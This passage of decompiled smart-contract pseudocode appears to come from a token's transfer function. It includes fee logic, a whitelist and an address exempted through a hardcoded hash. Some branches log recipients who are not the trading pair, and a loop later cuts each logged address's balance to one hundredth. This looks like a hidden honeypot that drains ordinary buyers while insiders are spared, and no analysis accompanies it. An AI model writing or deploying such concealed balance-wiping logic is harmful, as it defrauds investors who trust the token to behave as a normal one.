                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor15.length:
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    _640 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_640] = 26
                    mem[_640 + 32] = 'SafeMath: division by zero'
                    if idx >= stor15.length:
                        revert with 'NH{q', 50
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    balanceOf[stor15[idx].field_0] = balanceOf[stor15[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor15.length = 0
                mem[0] = 15
                idx = 0
                while 2 * stor15.length > idx:
                    stor15[idx].field_0 = 0
                    stor15[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7005 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7017 = mem[_7005]
                require mem[_7005] == mem[_7005 + 12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7035 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7041 = mem[_7035]
                require mem[_7035] == mem[_7035 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7041)
                require ext_code.size(address(_7017))
                staticcall address(_7017).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7041)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7059 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7059] == mem[_7059 + 12 len 20]
                if arg1 != mem[_7059 + 12 len 20]:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7113 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7131 = mem[_7113]
                    require mem[_7113] == mem[_7113 + 12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7179 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7209 = mem[_7179]
                    require mem[_7179] == mem[_7179 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7209)
                    require ext_code.size(address(_7131))
                    staticcall address(_7131).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7209)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7359 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7425 = mem[_7359]
                    require mem[_7359] == mem[_7359 + 12 len 20]
                    if mem[_7359 + 12 len 20] != msg.sender:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7791 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7791 + 32 len mem[_7791]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7425):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7815 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7815 + 32 len mem[_7815]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 6
                    if stor6[address(msg.sender)]:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7191 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7191 + 32 len mem[_7191]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7119 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7137 = mem[_7119]
                        require mem[_7119] == mem[_7119 + 12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7185 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7216 = mem[_7185]
                        require mem[_7185] == mem[_7185 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7216)
                        require ext_code.size(address(_7137))
                        staticcall address(_7137).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7216)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7380 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7452 = mem[_7380]
                        require mem[_7380] == mem[_7380 + 12 len 20]
                        if mem[_7380 + 12 len 20] != msg.sender:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
